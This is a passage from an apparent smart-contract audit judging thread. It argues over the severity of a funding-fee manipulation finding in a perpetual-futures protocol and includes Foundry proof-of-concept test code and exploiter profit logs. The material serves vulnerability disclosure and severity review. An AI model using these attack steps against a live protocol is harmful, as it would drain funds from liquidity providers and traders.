ORDER_GATEWAY),\n            abi.encode(relayer)\n        );\n\n        if (!clearingHouse.isAuthorized(trader_, relayer)) {\n            vm.prank(trader_);\n            clearingHouse.setAuthorization(relayer, true);\n        }\n        if (!clearingHouse.isAuthorized(maker_, relayer)) {\n            vm.prank(maker_);\n            clearingHouse.setAuthorization(relayer, true);\n        }\n\n        bytes memory makerData;\n        if (!config.isWhitelistedMaker(marketId, maker_)) {\n            makerData = abi.encode(IClearingHouse.MakerOrder({ amount: (size_.abs() * priceInEther) }));\n        }\n\n        vm.prank(relayer);\n        clearingHouse.openPositionFor(\n            IClearingHouse.OpenPositionForParams({\n                marketId: marketId_,\n                maker: maker_,\n                isBaseToQuote: size_ < 0, // b2q:q2b\n                isExactInput: size_ < 0, // (b)2q:q2(b)\n                amount: size_.abs(),\n                oppositeAmountBound: size_ < 0 ? 0 : type(uint256).max,\n                deadline: block.timestamp,\n                makerData: makerData,\n                taker: trader_,\n                takerRelayFee: takerRelayFee,\n                makerRelayFee: makerRelayFee\n            })\n        );\n    }\n\n    function _openPosition(uint256 marketId_, address maker_, int256 size_) internal {\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId_,\n                maker: maker_,\n                isBaseToQuote: size_ < 0, // b2q:q2b\n                isExactInput: size_ < 0, // (b)2q:q2(b)\n                amount: size_.abs(),\n                oppositeAmountBound: size_ < 0 ? 0 : type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n    }\n\n    function _openPositionFor(\n        uint256 marketId_,\n        address trader_,\n        address maker_,\n        int256 size_,\n        uint256 priceInEther, // when priceInEther = 1, it means 1 ether\n        address relayer,\n        uint256 takerRelayFee,\n        uint256 makerRelayFee\n    ) internal {\n        vm.prank(relayer);\n        clearingHouse.openPositionFor(\n            IClearingHouse.OpenPositionForParams({\n                marketId: marketId_,\n                maker: maker_,\n                isBaseToQuote: size_ < 0, // b2q:q2b\n                isExactInput: size_ < 0, // (b)2q:q2(b)\n                amount: uint256(size_),\n                oppositeAmountBound: size_ < 0 ? 0 : type(uint256).max,\n                deadline: block.timestamp,\n                makerData: abi.encode(IClearingHouse.MakerOrder({ amount: (uint256(size_) * priceInEther) })),\n                taker: trader_,\n                takerRelayFee: takerRelayFee,\n                makerRelayFee: makerRelayFee\n            })\n        );\n    }\n\n    function _getPosition(uint256 _marketId, address trader) internal view returns (PositionProfile memory) {\n        return\n            PositionProfile({\n                margin: vault.getMargin(_marketId, trader),\n                unsettledPnl: vault.getUnsettledPnl(_marketId, trader),\n                positionSize: vault.getPositionSize(_marketId, trader),\n                openNotional: vault.getOpenNotional(_marketId, trader)\n            });\n    }\n\n    function _getMarginProfile(\n        uint256 marketId_,\n        address trader_,\n        uint256 price_\n    ) internal view returns (LegacyMarginProfile memory) {\n        return\n            LegacyMarginProfile({\n                positionSize: vault.getPositionSize(marketId_, trader_),\n                openNotional: vault.getOpenNotional(marketId_, trader_),\n                accountValue: vault.getAccountValue(marketId_, trader_, price_),\n                unrealizedPnl: vault.getUnrealizedPnl(marketId_, trader_, price_),\n                freeCollateral: vault.getFreeCollateral(marketId_, trader_, price_),\n                freeCollateralForOpen: vault.getFreeCollateralForTrade(\n                    marketId_,\n                    trader_,\n                    price_,\n                    MarginRequirementType.INITIAL\n                ),\n                freeCollateralForReduce: vault.getFreeCollateralForTrade(\n                    marketId_,\n                    trader_,\n                    price_,\n                    MarginRequirementType.MAINTENANCE\n                ),\n                marginRatio: vault.getMarginRatio(marketId_, trader_, price_)\n            });\n    }\n}\n\n```\n</details>\n\n<b>Results:</b>\n\n<details>\n<summary>Results without additional liquidity</summary>\n\n1.0e18\n\n```text\n  Exploiter Quote balance at Start: 6000000000000\n  Funding Fee Rate after short:\n  -4999999999999999\n  Exploiter's margin after both positions are closed: \n  6000469396048061562010464\n  Exploiter Quote balance at End: 6000469396048\n```\n\n1.1e18\n\n```text\n  Exploiter Quote balance at Start: 6000000000000\n  Funding Fee Rate after short:\n  -22216831940191314\n  Exploiter's margin after both positions are closed: \n  6013757379972937374446274\n  Exploiter Quote balance at End: 6013757379972\n```\n\n1.2e18\n\n```text\n  Exploiter Quote balance at Start: 6000000000000\n  Funding Fee Rate after short:\n  -98717524291740992\n  Exploiter's margin after both positions are closed: \n  6072800761109523310766846\n  Exploiter Quote balance at End: 6072800761109\n```\n\n1.3e18\n\n```text\n  Exploiter Quote balance at Start: 6000000000000\n  Funding Fee Rate after short:\n  -438638129348272645\n  Exploiter's margin after both positions are closed: \n  6335152136287961664972890\n  Exploiter Quote balance at End: 6335152136287\n```\n\n</details>\n\n<details>\n<summary>Results with 500k additional liquidity</summary>\n\n1.0e18\n\n```text\n  LP balance before the deposit to Uniswap 500000000000\n  Exploiter Quote balance at Start: 6000000000000\n  Funding Fee Rate after short:\n  -4999999999999999\n  Exploiter's margin after both positions are closed: \n  6002719260427242602066921\n  Balance of LP before UNI V3 position burn: 0\n  Balance of LP after UNI V3 position burn: 500250125061\n  The amount received after burn of the UNI V3 position is 500250125061\n  Exploiter Quote balance at End: 6002719260427\n  LP balance at End 500250125061\n```\n\n1.1e18\n\n```text\n  LP balance before the deposit to Uniswap 500000000000\n  Exploiter Quote balance at Start: 6000000000000\n  Funding Fee Rate after short:\n  -22216831940191314\n  Exploiter's margin after both positions are closed: \n  6024615628368772567260182\n  Balance of LP before UNI V3 position burn: 0\n  Balance of LP after UNI V3 position burn: 500250125061\n  The amount received after burn of the UNI V3 position is 500250125061\n  Exploiter Quote balance at End: 6024615628368\n  LP balance at End 500250125061\n```\n\n1.2e18\n\n```text\n  LP balance before the deposit to Uniswap 500000000000\n  Exploiter Quote balance at Start: 6000000000000\n  Funding Fee Rate after short:\n  -98717524291740992\n  Exploiter's margin after both positions are closed: \n  6121909213700285378260942\n  Balance of LP before UNI V3 position burn: 0\n  Balance of LP after UNI V3 position burn: 500250125061\n  The amount received after burn of the UNI V3 position is 500250125061\n  Exploiter Quote balance at End: 6121909213700\n  LP balance at End 500250125061\n```\n\n1.3e18\n\n```text\n  LP balance before the deposit to Uniswap 500000000000\n  Exploiter Quote balance at Start: 6000000000000\n  Funding Fee Rate after short:\n  -438638129348272645\n  Exploiter's margin after both positions are closed: \n  6554220260534061969137516\n  Balance of LP before UNI V3 position burn: 0\n  Balance of LP after UNI V3 position burn: 500250125061\n  The amount received after burn of the UNI V3 position is 500250125061\n  Exploiter Quote balance at End: 6554220260534\n  LP balance at End 500250125061\n```\n</details>\n\n\n**midori-fuse**\n\nFrom the PoC (both the recently provided PoC, the PoC on the submission, and the sponsor's test file):\n\n> `config.setFundingConfig(marketId, 0.005e18, 1.0e18, address(oracle_maker));`\n\nAside from the funding exponent, there is also the *funding rate* (check [function signature](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/config/Config.sol#L156)), and it's currently being set at a very unrealistic value. Here's why.\n\nAlthough it's not known before the contest, the sponsor stated [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2068671912) that the intended funding rate (not exponent) is 100% to 500% a year. The given config (on the sponsor's comment) also looks weird, because 86400 is the number of seconds in a day, not in a year (for a year, it's 31536000 seconds).\n\nLet's just say it's 500% a day, then $5/86400 \\approx 6 * 10^{-5}$ per second. Then the funding rate in the PoC being $100$ times higher than intended (and if being 500% a *year*, then it's $36500$ times higher than intended). A funding rate of 100% a day means, at 1.0 exponent and max utilization, you pay a fee worth 100% of your position *per day*. How is a fee of 5 times higher than this realistic?\n\nFor a reference of what a \"realistic\" value is, [Binance Futures's funding rate](https://www.binance.com/en/futures/funding-history/perpetual/real-time-funding-rate) are mostly 0.01% for most assets, and the funding interval is 8 hours. That means one side pays the other 0.01% worth of their position every 8 hours. Divided by the number of seconds in 8 hours, this gives a funding rate of $3.47 * 10^{-7}$% (or $3.47 * 10^{-9}$) per second, even if they technically don't pay this fee that often.\n\nBack to the main issue, a funding rate of 500% per year (as per the sponsor's comment) is $5/(365*86400) = 1.6 * 10^{-7}$. Then a funding rate of `0.005e18` or $5 * 10^{-3}$ per second is at least $30000$ times higher than the sponsor's stated upper bound of value. Let us also note that this value is only achievable on the maximum utilization (smaller utilizations scale down proportionally), and that 500% is the **upper bound** on the sponsor's stated value, not the realistic intended value.\n\nThen any given profit from the funding fee has to be divided by $30000$, and the loss (from swaps, network fee, spread, etc) stays the same. \n\nTo sum up, because the funding rate is by *second*, and not anything else, the correct funding config for a 1.0 exponent and 500% funding rate per year should be:\n\n```solidity\nconfig.setFundingConfig(marketId, 0.00000016e18, 1.0e18, address(oracle_maker)); // 5e18 divided by the number of seconds in a year\n```\n\nAnd the attack is no longer profitable, even on the upper bound of the sponsor's stated funding rate. \n\nBecause the attack is no longer profitable, and the fee per second is so small (comparable to that of the interest rate of a standard lending protocol), and also because the attacker carries a significant risk of holding a large position for a minimal fee profit, **I will also go the distance and am arguing this to be a Low**. \n\n**midori-fuse**\n\nI am also providing my own PoC to prove my claim that the current funding rate is far too high to be realistic\n\n<details>\n<summary>Code</summary>\n\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol\";\nimport { OracleMaker } from \"../../src/maker/OracleMaker.sol\";\nimport \"../../src/common/LibFormatter.sol\";\nimport { SignedMath } from \"@openzeppelin/contracts/utils/math/SignedMath.sol\";\n\ncontract FundingFeeExploit is SpotHedgeBaseMakerForkSetup {\n    using LibFormatter for int256;\n    using LibFormatter for uint256;\n    using SignedMath for int256;\n\n    address public taker = makeAddr(\"Taker\");\n    address public exploiter = makeAddr(\"Exploiter\");\n    OracleMaker public oracle_maker;\n\n    function setUp() public override {\n        super.setUp();\n        //create oracle maker\n        oracle_maker = new OracleMaker();\n        _enableInitialize(address(oracle_maker));\n        oracle_maker.initialize(marketId, \"OM\", \"OM\", address(addressManager), priceFeedId, 1e18);\n        config.registerMaker(marketId, address(oracle_maker));\n\n        //PARAMETERS SETUP\n\n        // fee setup\n        // funding fee configs (0.5% per second)\n        config.setFundingConfig(marketId, 0.005e18, 1.0e18, address(oracle_maker));\n        // borrowing fee 0 per second\n        config.setMaxBorrowingFeeRate(marketId, 0, 0);\n        oracle_maker.setMaxSpreadRatio(0.1 ether); // 10% as in team tests\n        \n        //whitelist users\n        oracle_maker.setValidSender(exploiter,true);\n        oracle_maker.setValidSender(taker,true);\n        \n        //mock the pyth price to be same as uniswap (set to ~$2000 in base class)\n        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);\n        _mockPythPrice(2000,0);\n    }\n\n    function testFundingFeeTooHighPOC() public {\n        //deposit 5M collateral as margin for alice AND exploiter (also mints the amount)\n        uint256 startQuote = 5000000*1e6;\n        _deposit(marketId, exploiter, startQuote);\n\n        //deposit 2M to oracle maker\n        //initial oracle maker deposit: $2M (1000 base tokens)\n        vm.startPrank(makerLp);\n        deal(address(collateralToken), makerLp, 2000000*1e6, true); \n        collateralToken.approve(address(oracle_maker), type(uint256).max);\n        oracle_maker.deposit(2000000*1e6);\n        vm.stopPrank();\n\n        // Maximum utilization (-1000 base tokens) long on oracle maker\n        vm.startPrank(exploiter);\n        (int256 posBase, int256 openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 1000*1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        console.log(\"Funding Fee Rate after short:\");\n        int256 ffeeRate = fundingFee.getCurrentFundingRate(marketId);\n        console.logInt(ffeeRate);\n\n        // OUTPUT:\n        // Funding Fee Rate after short:\n        // -4999999999999999\n        // i.e. fully utilized --> 0.5% per second\n\n        // note that the current \"exploiter\" has an open notional of 2 million USDC\n        // at a funding rate of 0.5% per second, 2 million USDC worth their margin gets wiped out \n        // after only 200 seconds\n        console.log(\"Exploiter's margin at start:\");\n        console.logInt(vault.getMargin(marketId, address(exploiter)));\n        console.log(\"Open notional:\");\n        console.logInt(vault.getOpenNotional(marketId, address(exploiter)));\n        console.log(\"\");\n\n        // every 100 seconds, 1 million worth of margin gets wiped\n        // after only 500 seconds, only the round-off amount is left\n        for (uint i = 1; i <= 5; i++) {\n            vm.warp(block.timestamp + 100 seconds);\n            console.log(\"Block timestamp: %d\", block.timestamp);\n            console.log(\"Exploiter margin after %d seconds:\", i*100);\n            console.logInt(vault.getMargin(marketId, address(exploiter)));\n            console.log(\"\");\n        }\n    }\n}\n```\n\n</details>\n\nTo run, paste the entire code as a file `test/spotHedgeMaker/test.t.sol`, and run `forge test --match-test testFundingFeeTooHighPOC -vv`.\n\nWhat the PoC does is similar to what the original submission's PoC did, albeit simplified:\n- Deposits 2 million of margin into the Oracle Maker, with the min margin ratio being 100%.\n- Deals the \"exploiter\" 5 million.\n- The \"exploiter\" opens a position on the OM, worth 2 million. \n \nThat's it. We're done, just wait and watch the fee do the work. The exploiter won't exploit anything, but this is to show how fast the exploiter already loses money when using the test setting.\n\nNow, the OM's utilization rate is 100%, and the funding rate is 0.5% per second. That means in 100 seconds, the funding rate is 50%, and in 200 seconds, the funding rate is 100% i.e. the entire trader's open notional equivalent gets wiped out as fees within 200 seconds.\n\nAnd indeed, the console log is as follow:\n\n<details>\n<summary>Test output</summary>\n\n```\nFunding Fee Rate after short:\n  -4999999999999999\n  Exploiter's margin at start:\n  5000000000000000000000000\n  Open notional:\n  -2000000000000000000000000\n  \n  Block timestamp: 1686203821\n  Exploiter margin after 100 seconds:\n  4000000000000000200000000\n  \n  Block timestamp: 1686203921\n  Exploiter margin after 200 seconds:\n  3000000000000000400000000\n  \n  Block timestamp: 1686204021\n  Exploiter margin after 300 seconds:\n  2000000000000000600000000\n  \n  Block timestamp: 1686204121\n  Exploiter margin after 400 seconds:\n  1000000000000000800000000\n  \n  Block timestamp: 1686204221\n  Exploiter margin after 500 seconds:\n  1000000000\n```\n\n</details>\n\nUsing the \"test config\", 1 million of the exploiter/trader's USDC gets wiped out *every 100 seconds*. How is a fee of 100% the open notional every 200 seconds, or 3 minutes 20 seconds, anything realistic, or even remotely close to the sponsor's stated value or any perp trading platforms out there?\n- Suppose the utilization is *not* 100%, but 10% i.e. exploiter/trader opens an OM position of 200k only. Then the fee speed is 10% of the original, which is still 100k per 100 seconds, and 2M of margin will still get erased in 2000 seconds, or 33 minutes 20 seconds.\n\nIf you change the exponent to 1.1e18, the funding rate gets even more aggressive, and the exploiter/trader's entire margin of 5 million gets almost wiped out in the first 100 seconds.\n\n**midori-fuse**\n\nLet us also do some math and prove why this is a **Low**.\n\nFor the sponsor's upper bound of 500% per year, the funding rate per second divides to 1.6e-7. That means for every 16 million USD worth of open notional, **assuming the OM stays at 100% utilization**, the \"exploiter\" earns one dollar worth of fee per second. Then the so-called exploit's profit is $1 per second for the following constraints/external conditions:\n- Gas fees.\n- Uniswap slippage for 16 million worth of assets. \n  - The TVL of the USDC/WETH pool is 4 million, so such a swap is not even possible as of current.\n  - Lowering the position for an easier swap will *both* lower the open notional, and the utilization rate, so the decrease in profit is two-fold.\n- Borrowing fees, paid *back* to the makers, from a position worth 16 million.\n- Price exposure on a position worth 16 million. If the attacker uses leverage, then their entire margin may get wiped out from liquidation.\n- The OM's TVL and min margin ratio has to even be able to take 16 million to begin with. It has already been mentioned above that even Uniswap's TVL on USDC/WETH pool is 4 times lower than this.\n- The attacker has to *keep* the util rate at 100% to achieve such rate of $1 per second. \n  - This equates to keeping the position's open notional up with the OM's TVL, *and* counter-opening any regular positions traded against the OM, while accepting the price spread, all just to keep the util rate at 100%.\n\nAssuming the number is not actually 16 million, but whatever the OM's TVL is. Then the attacker's profit from fees decrease accordingly, while every other losses and risks stay the same. **Note that the exploiter's position must closely match the OM's TVL at all times, to keep utilization (and thus funding fee) high**, so they cannot choose a \"smaller\" exploit for a less gain, because the gain is not proportional.\n\nAny single one of the aforementioned factors alone (maybe except for gas fees) already outweights the \"profit\", not to mention all of them combined. Then the effect is far too small for a risk far too great, and thus this cannot be considered a medium.\n\n**WangSecurity**\n\nThank you for that insightful input and new POCs, I will give some time for @gstoyanovbg to provide counter arguments to your messages.\n\n**WangSecurity**\n\nIn the meantime, thank you @midori-fuse for these comprehensive calculations. But I've ran into problem with the most recent @gstoyanovbg POC, it's very massive and my PC is not powerful, hence, it runs infinitely and doesn't finish. I've tried several times and it still doesn't seem to be working. Therefore, I want to ask @IllIllI000 or @midori-fuse to run [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2093274415) test and confirm the output.\n\nRegarding the funding rate inside the funding config, is there any evidence (either from documentation/discord messages/code) what can be the realistic value of the funding rate?(question 1) Unfortunately, the funding rate of 100%-500% was provided after the contest. As I understand the following factors effect the profit of this attack:\n\n1. Funding exponent (set by a TRSUTED admin).\n2. Funding rate (set by a TRUSTED admin).\n3. Liquidity at a certain price range (external condition, but can be influenced by the attacker).\n4. High cost (flash loans cannot be used, cause minimum 2 blocks are required for the attack).\n5. Borrowing fees (but as I understand, if the attacker indeed has sufficient funds to execute the attack, they won't borrow funds, hence, no borrowing fee (question 2).\n6. Uniswap Slippage (as I understand opening a position requires making a swap on Uniswap equal to the position size, correct? (question 3)).\n\nIs there anything else that should be added to the list? (question 4).\n\nDespite the profits of the attacker in the end, the loss of funds for users is certain, correct? (question 5).\n\n**gstoyanovbg**\n\nIt is true that the sponsor states they expect 100-500% annually, but at the same time, \"fundingFactor: 200% / 86400\".\n\n200 / 86400 = 0.0023\n500 / 86400 = 0.0057\n\nBoth numbers are comparable to 0.005 - the value used for fundingFactor in tests. Based on what is said, it seems that sponsors calculated what the value of fundingFactor should be this way. However, the contradiction is clear; ultimately, the code depends on the parameter passed, not on the words used to explain what the code should do. Therefore, the value passed for the parameter should carry more weight than an explanation expressed in potentially ambiguous words. If we assume that this issue was not submitted, we have all the evidence to believe that the sponsors would have passed a value between 0.001 and 0.005 for fundingFactor, which would have led to serious losses, as already demonstrated. When I mentioned realistic values in previous comments, I meant realistic within the context of this contest. In other words, realistic values are those that the administrator would choose, especially since we know what they are. Otherwise, we could say that the administrator could set the value to 0 and this bug would not be valid. But that wouldn't make sense. I don't find logic in considering the value 0.00000016e18 as realistic, especially when the sponsor twice states that they will use a value in the range of 0.002-0.005 (once in the test and once in a comment). In my opinion, the above comments are a good addition to the discussion, but they have no relation to the severity of this finding.\n\nNevertheless, I will briefly comment on the conclusions of midori-fuse. To be precise, 5e18 / 31536000 = 158548959919. This will be the value I will use for fundingFactor for the test I will conduct using my POC. As correctly pointed out, the current attack with 2 consecutive blocks is not profitable (there is a negligible loss). However, as I mentioned in some of my previous comments, this is not the only way to exploit this issue. One winning attack scenario is to execute the scenario from my last POC for a longer period. In other words, positions are not closed on the next block. To demonstrate that this is profitable, I execute the attack scenario that adds additional liquidity by changing the duration to 86400 seconds (1 day). \n```text\n LP balance before the deposit to Uniswap 4000000000000\n  Exploiter Quote balance at Start: 6000000000000\n  Funding Fee Rate after short:\n  -158548959918\n  Exploiter's margin after both positions are closed: \n  6026027095578931798057495\n  Balance of LP before UNI V3 position burn: 0\n  Balance of LP after UNI V3 position burn: 4002001000499\n  The amount received after burn of the UNI V3 position is 4002001000499\n  Exploiter Quote balance at End: 6026027095578\n  LP balance at End 4002001000499\n```\n\nFrom the log, we see a profit of $14,019 from positions and a profit of $2001 from the provided liquidity in Uniswap. Therefore, I can conclude that the attack may be profitable if executed for a long enough period. The execution time does not need to be continuous because, as seen, there are no losses from slippage and fees. One way to execute this is for the attacker to open symmetric positions in oracle maker and SpotHedgeBaseMaker, reaching the max funding rate as in my POC. The goal is for potential losses from price changes to be neutralized. The expected behavior is for other traders to be incentivized enough to open a position in the opposite direction in oracle maker to make a profit from the funding fee but also to reduce the attacker's profit. At this point, the attacker can reverse the symmetric positions (long become short for example) in order to continue the attack or close them, waiting for a convenient moment to execute the attack again. The important thing is to accumulate enough time during which the attack is active to lock in profits.\n\nI hope I provided a good intuition for how the attack can be profitable, although, in my opinion, realistic values in the context of this audit are 0.001-0.005.\n\nP.S I want to note that in my POC all the losses and profits are taken into consideration and in the logs that i shared you can see that profits are greater. \n\n**gstoyanovbg**\n\n> In the meantime, thank you @midori-fuse for these comprehensive calculations. But I've ran into problem with the most recent @gstoyanovbg POC, it's very massive and my PC is not powerful, hence, it runs infinitely and doesn't finish. I've tried several times and it still doesn't seem to be working. Therefore, I want to ask @IllIllI000 or @midori-fuse to run [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2093274415) test and confirm the output.\n> \n> Regarding the funding rate inside the funding config, is there any evidence (either from documentation/discord messages/code) what can be the realistic value of the funding rate?(question 1) Unfortunately, the funding rate of 100%-500% was provided after the contest. As I understand the following factors effect the profit of this attack:\n> \n> 1. Funding exponent (set by a TRSUTED admin).\n> 2. Funding rate (set by a TRUSTED admin).\n> 3. Liquidity at a certain price range (external condition, but can be influenced by the attacker).\n> 4. High cost (flash loans cannot be used, cause minimum 2 blocks are required for the attack).\n> 5. Borrowing fees (but as I understand, if the attacker indeed has sufficient funds to execute the attack, they won't borrow funds, hence, no borrowing fee (question 2).\n> 6. Uniswap Slippage (as I understand opening a position requires making a swap on Uniswap equal to the position size, correct? (question 3)).\n> \n> Is there anything else that should be added to the list? (question 4).\n> \n> Despite the profits of the attacker in the end, the loss of funds for users is certain, correct? (question 5).\n\n@WangSecurity Are you sure that the POC consumes a lot of resources, did you check the load of your system ? Is your ENV file correctly populated ? I can record a video for you if you want or can give you remote access. DM me if you think that this will help.\n\nQuestion 1: I am ware only for the tests.\nQuestion 2: Borrowing fee is part of the protocol it is not external borrowing fee but in my POC i took it into consideration.\nQuestion 3: Only in SHBM.\nQuestion 4: The list looks correct to me.\nQuestion 5: The profits are more than the losses if you execute the attack correctly (visible from the POC). And yes the losses for users are certain.\n\n**midori-fuse**\n\n> It is true that the sponsor states they expect 100-500% annually, but at the same time, \"fundingFactor: 200% / 86400\".\n\n- 200% is not 200, it is 2. Even if the funding rate is 500% per **day**, the funding rate of 0.5% per **second** is *still* 86 times higher than the testing config. They are not comparable.\n- The sponsor made a mistake here. $86400$ is the number of seconds in a day, not in a year. \n- During the [funding fee calculation](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/fundingFee/FundingFee.sol#L129-L139), the funding rate is never divided by the number of seconds in a year, and [it is also not divided](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/config/Config.sol#L156) when setting the config. Alongside my PoC, this proves that the funding rate is by second, and not by anything else.\n\n> When I mentioned realistic values in previous comments, I meant realistic within the context of this contest. In other words, realistic values are those that the administrator would choose, especially since we know what they are.\n\nAdditionally addressing @WangSecurity's question 1 by providing examples of real-life exchanges:\n\n> Regarding the funding rate inside the funding config, is there any evidence (either from documentation/discord messages/code) what can be the realistic value of the funding rate?(question 1)\n\nThis [coinglass](https://www.coinglass.com/FundingRate) link shows the funding rate of 13 different perpetual exchanges, all of them in the range of about 0.01% per 8 hours, which is 1.4 million times higher than the testing config of 0.5% per second. You can also click on any asset to view their historical funding rate.\n\nWhen the docs do not tell us what the intended value is, then we must use reasonable values. As external evidences by other perpetual exchanges have pointed out, the values I calculated are realistic.\n\nIf you still disagree, please provide reference to any code/docs or any existing perpetual exchanges to prove 0.5% per ~~day~~ second is anything \"realistic\". The testing fee config does not prove anything if it's a million times higher than multiple real-life exchanges.\n\n> To demonstrate that this is profitable, I execute the attack scenario that adds additional liquidity by changing the duration to 86400 seconds (1 day).\n\nThe new PoC is leaving the position open for a *day*, which exposes it to the following factors:\n- *As soon as* any regular traders opens a position *within the entire day*, the utilization rate of the OM decreases, and the extreme funding rate is no longer existent.\n- To maintain your extreme funding rate, you must open a counter-position i.e. repeating the same attack steps, which further exposes you to:\n  - Another wave of UniV3 slippage.\n  - The OM's price spread premium, preventing you from even being able to reopen the position at the oracle price.\n- When you skew the UniV3 price away from the oracle price during the SHBM step, you created an arb scenario that undoes your position by doing the opposite of what you did. Any party would be happy to take the arbing profit.\n- You start with a balance of $10 million (6 in margin, 4 in LP), and walks away with 28k \"profit\" or a 0.28% profit, if and only if:\n  - The price moves in your favor when you close it out. \n  - **No one** trades during the entire day. Any trades made reduces your \"profit\" by UniV3 slippage and OM's price spread premium.\n\nAs you have stated yourself that *maintaining* the position for a long time is a required factor for this attack:\n\n> The important thing is to accumulate enough time during which the attack is active to lock in profits.\n\nAddressing @WangSecurity's concerns for question 4 and 5 at the same time:\n\n> Despite the profits of the attacker in the end, the loss of funds for users is certain, correct?\n\nQuoting [Sherlock rules, section III (Sherlock's standards), point 2 on the matter of griefing](https://docs.sherlock.xyz/audits/judging/judging#iii.-sherlocks-standards):\n\n> Additional constraints related to the issue may decrease its severity accordingly.\n\nAs I have laid out in my previous [comment](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2093975724), there are far too many factors to this to be considered a medium, which additionally addresses another of your concern:\n\n> Is there anything else that should be added to the list? (question 4).\n\n- Because the attack involves a large UniV3 swap, the UniV3 price is pushed away from the Oracle price, which creates a natural arbitrage scenario that reverses the effects of the attack.\n  - This also answers Wang's question 3: Yes, the attack involves a UniV3 swap of a volume equal to the attack position.\n- In order to generate a utilization of 100%, you have to swap up to the entire position capacity of the OM. Additionally, you have to **maintain** the high utilization. The higher the utilization is, the more costly it is to maintain the position, as you have to pay more premium to move the util rate up. Overall the griefing is **not** delta-neutral due to both the UniV3 swap and the OM's spread premium.\n\nThis actually adds another factor affecting the profit of the attack: The OM's price spread. Due to issue #25 , the spread is not applied when the attack is first performed (e.g. pushing the util rate from 0% to 100% will not apply the premium), but it is applied whenever the position is maintained (e.g. pushing the util rate from 90% to 100% *will* apply the premium at 90%).\n\nSpending 10 million dollars to grief-push the funding rate to 500% a year for a guaranteed loss, as well as having to maintain it for additional loss, and combining the factors you mentioned alongside my own outlined ones, is enough to consider this attack unrealistic and a non-medium.\n\n**gstoyanovbg**\n\n@midori-fuse \n\n> 200% is not 200, it is 2. Even if the funding rate is 500% per day, the funding rate of 0.5% per second is still 86 times higher than the testing config. They are not comparable.\n\nI know but how do you think that the sponsor calculated the value 0.005e18 ?? It is just ~500/86400. I believe that they meant the same with this 200% - 200/86400 not 2 / 86400.\n\n> The sponsor made a mistake here. 86400 is the number of seconds in a day, not in a year.\n\nBut the sponsor would have made the same mistake in production as well without this finding.\n\n> During the [funding fee calculation](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/fundingFee/FundingFee.sol#L129-L139), the funding rate is never divided by the number of seconds in a year, and [it is also not divided](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/config/Config.sol#L156) when setting the config. Alongside my PoC, this proves that the funding rate is by second, and not by anything else.\n\nI don't understand what your POC prove and why it have only 1 position opened which loss value over time, which is normal.\n\n> This [coinglass](https://www.coinglass.com/FundingRate) link shows the funding rate of 13 different perpetual exchanges, all of them in the range of about 0.01% per 8 hours, which is 1.4 million times higher than the testing config of 0.5% per second. You can also click on any asset to view their historical funding rate.\n\nI am not aware how the funding rate is implemented on each of these protocols so this is not argument for me. The only thing that matters is the current protocol. How can i know that all these protocols have same implementation of funding fee like this one ?\n\n> When the docs do not tell us what the intended value is, then we must use reasonable values. As external evidences by other perpetual exchanges have pointed out, the values I calculated are realistic.\n\nDisagree. Already explained why,\n\n> If you still disagree, please provide reference to any code/docs or any existing perpetual exchanges to prove 0.5% per day is anything \"realistic\". The testing fee config does not prove anything if it's a million times higher than multiple real-life exchanges.\n\nI truly hope you don't expect me to go through all the perpetual protocols and compare their implementations and funding rates with those we have here. Sponsors have the right to choose; it's their protocol, and they have chosen to test with a specific value. Or do you think that they decided to test with a value a million times larger than what they intend to use?\n\n> The new PoC is leaving the position open for a day, which exposes it to the following factors:\nAs soon as any regular traders opens a position within the entire day, the utilization rate of the OM decreases, and the extreme funding rate is no longer existent.\nTo maintain your extreme funding rate, you must open a counter-position i.e. repeating the same attack steps, which further exposes you to:\nAnother wave of UniV3 slippage.\nThe OM's price spread premium, preventing you from even being able to reopen the position at the oracle price.\nWhen you skew the UniV3 price away from the oracle price during the SHBM step, you created an arb scenario that undoes your position by doing the opposite of what you did. Any party would be happy to take the arbing profit.\nYou start with a balance of $10 million (6 in margin, 4 in LP), and walks away with 28k \"profit\" or a 0.28% profit, if and only if:\nThe price moves in your favor when you close it out.\nNo one trades during the entire day. Any trades made reduces your \"profit\" by UniV3 slippage and OM's price spread premium.\n\nFirstly, I hope this paragraph is not an attempt to distort my words. The open position for 1 day was simply to demonstrate that if the attack works for 86400 seconds, we have a profit. Just an example, nothing more. I also explained that it is not necessary for the 86400 seconds to be consecutive. I want to ask, have you spent more than 5 minutes on the POC I uploaded a day or two ago? From your words, I understand that you haven't. And once again, I'll repeat, the issue with slippage is manageable.\n\n> As you have stated yourself that maintaining the position for a long time is a required factor for this attack:\n\nThis is not correct. I have stated that if you reduce the fundingFactor 1 million times (compared to the one from the tests) it is a possible way to conduct the attack. Maybe not the only one maybe even not the best one. And this is not a limitation because this value is beyond any reasonable deviation from the value in the test files\n\nTill the end of your post you provide arguments that i think that was discussed many times. I think that we already provided our arguments and the judge has enough information to make a decision. I don't see the point in repeating the same thing over and over again. @WangSecurity if you have more questions to me i can answer but don't plan to continue to answer comments that doesn't 